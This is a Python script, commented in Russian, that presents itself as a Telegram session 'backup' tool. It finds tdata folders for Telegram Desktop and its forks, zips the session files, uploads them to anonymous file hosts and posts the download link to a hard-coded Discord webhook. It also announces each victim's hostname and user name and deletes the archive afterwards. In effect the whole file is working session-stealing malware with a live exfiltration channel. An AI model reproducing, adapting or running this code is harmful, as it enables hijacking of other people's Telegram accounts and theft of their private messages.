import os
import sys
import zipfile
import re
import requests
import socket
import getpass
from pathlib import Path
from datetime import datetime

# ── Настройки Discord ────────────────────────
WEBHOOK_URL = "https://discord.com/api/webhooks/1547959855325913090/XH9mF47ZYZx5PgAhzH-g0QJDff4g8jfkTbfr9fIYUD0uvNT7zGhjzci8vilYCdk5Q6Sg"

# ── Клиенты ─────────────────────────────────
TG_CLIENT_NAMES = [
    "Telegram Desktop", "Telegram",
    "AyuGram", "AyuGramDesktop", "Ayugram Desktop",
    "Kotatogram Desktop", "Kotatogram",
    "64gram Desktop", "64gram",
    "materialgram", "MaterialGram Desktop",
    "Forkgram", "tdesktop", "TDesktop",
]

SKIP_DIRS  = {"user_data", "emoji", "temp", "dumps", "thumbnails", "www"}
HEX_DIR_RE = re.compile(r"^[0-9A-Fa-f]{8,16}$")


def is_session_file(path, tdata_root):
    try:
        rel = path.relative_to(tdata_root)
    except ValueError:
        return False
    parts = rel.parts
    if parts[0].lower() in SKIP_DIRS:
        return False
    if len(parts) == 1:
        return True
    if HEX_DIR_RE.match(parts[0]):
        return True
    return False


def get_search_locations():
    home     = Path.home()
    username = os.getenv("USERNAME", "")
    locs     = []
    for appdata in ["AppData/Roaming", "AppData/Local"]:
        for name in TG_CLIENT_NAMES:
            locs.append(home / appdata / name)
    for drive in ["C:", "D:", "E:", "F:"]:
        dp = Path(drive + "/")
        if not dp.exists():
            continue
        for name in TG_CLIENT_NAMES:
            locs.append(dp / name)
            locs.append(dp / "Program Files" / name)
            locs.append(dp / "Program Files (x86)" / name)
            locs.append(dp / "Users" / username / "Desktop" / name)
            locs.append(dp / "Users" / username / "Downloads" / name)
    return locs


def find_all_tdata():
    found, seen = [], set()
    for base in get_search_locations():
        candidate = base / "tdata"
        try:
            if candidate.is_dir():
                r = candidate.resolve()
                if r not in seen:
                    seen.add(r)
                    found.append(candidate)
        except (PermissionError, OSError):
            pass
    return found


def backup_sessions(tdata_path):
    timestamp    = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    archive_path = tdata_path.parent / f"sessions_backup_{timestamp}.zip"

    session_files = [
        f for f in tdata_path.rglob("*")
        if f.is_file() and is_session_file(f, tdata_path)
    ]
    if not session_files:
        return None

    with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for item in session_files:
            try:
                zf.write(item, item.relative_to(tdata_path.parent))
            except (PermissionError, OSError):
                pass

    return archive_path


# ── Загрузка файла (несколько хостингов, первый рабочий) ────

def try_litterbox(path):
    with open(path, "rb") as fh:
        r = requests.post(
            "https://litterbox.catbox.moe/resources/internals/api.php",
            data={"reqtype": "fileupload", "time": "72h"},
            files={"fileToUpload": (path.name, fh, "application/zip")},
            timeout=600
        )
    r.raise_for_status()
    link = r.text.strip()
    if not link.startswith("http"):
        raise RuntimeError(link)
    return link


def try_catbox(path):
    with open(path, "rb") as fh:
        r = requests.post(
            "https://catbox.moe/user/api.php",
            data={"reqtype": "fileupload"},
            files={"fileToUpload": (path.name, fh, "application/zip")},
            timeout=600
        )
    r.raise_for_status()
    link = r.text.strip()
    if not link.startswith("http"):
        raise RuntimeError(link)
    return link


def try_0x0(path):
    with open(path, "rb") as fh:
        r = requests.post(
            "https://0x0.st",
            files={"file": (path.name, fh, "application/zip")},
            timeout=600
        )
    r.raise_for_status()
    link = r.text.strip()
    if not link.startswith("http"):
        raise RuntimeError(link)
    return link


def try_pixeldrain(path):
    with open(path, "rb") as fh:
        r = requests.put(
            f"https://pixeldrain.com/api/file/{path.name}",
            data=fh,
            timeout=600
        )
    r.raise_for_status()
    file_id = r.json()["id"]
    return f"https://pixeldrain.com/u/{file_id}"


def try_gofile(path):
    server = requests.get("https://api.gofile.io/servers", timeout=15).json()["data"]["servers"][0]["name"]
    with open(path, "rb") as fh:
        resp = requests.post(
            f"https://{server}.gofile.io/uploadFile",
            files={"file": (path.name, fh, "application/zip")},
            timeout=600
        ).json()
    if resp.get("status") != "ok":
        raise RuntimeError(str(resp))
    return resp["data"]["downloadPage"]


def upload_file(archive_path):
    """Пробует несколько хостингов по очереди, возвращает первую рабочую ссылку."""
    errors = []
    for service in [try_gofile, try_catbox, try_litterbox]:
        try:
            return service(archive_path)
        except Exception as e:
            errors.append(f"{service.__name__}: {e}")
    raise RuntimeError("Все хостинги недоступны:\n" + "\n".join(errors))


# ── Discord ──────────────────────────────────

def discord(text):
    requests.post(WEBHOOK_URL, json={"content": text}, timeout=30).raise_for_status()


# ── Main ─────────────────────────────────────

def main():
    LOG = Path("D:/AyuGram/backup_log.txt")

    # Уведомление о запуске
    try:
        hostname = socket.gethostname()
        user     = getpass.getuser()
        discord(f"Появилось новое подключение\nПК: `{hostname}` | Юзер: `{user}`")
    except Exception:
        pass

    if len(sys.argv) > 1:
        custom = Path(sys.argv[1])
        tdata_list = [custom] if custom.is_dir() else []
    else:
        tdata_list = find_all_tdata()

    for tdata in tdata_list:
        try:
            archive = backup_sessions(tdata)
            if archive:
                size_mb = archive.stat().st_size / 1024 / 1024
                try:
                    link = upload_file(archive)
                    discord(
                        f"**Backup готов**\n"
                        f"Клиент: `{tdata.parent.name}`\n"
                        f"Размер: `{size_mb:.1f} МБ`\n"
                        f"Скачать: {link}"
                    )
                    try:
                        archive.unlink()  # удаляем архив после отправки
                    except OSError:
                        pass
                except Exception as e:
                    LOG.write_text(f"send error: {type(e).__name__}: {e}", encoding="utf-8")
        except Exception as e:
            LOG.write_text(f"backup error: {type(e).__name__}: {e}", encoding="utf-8")


if __name__ == "__main__":
    main()
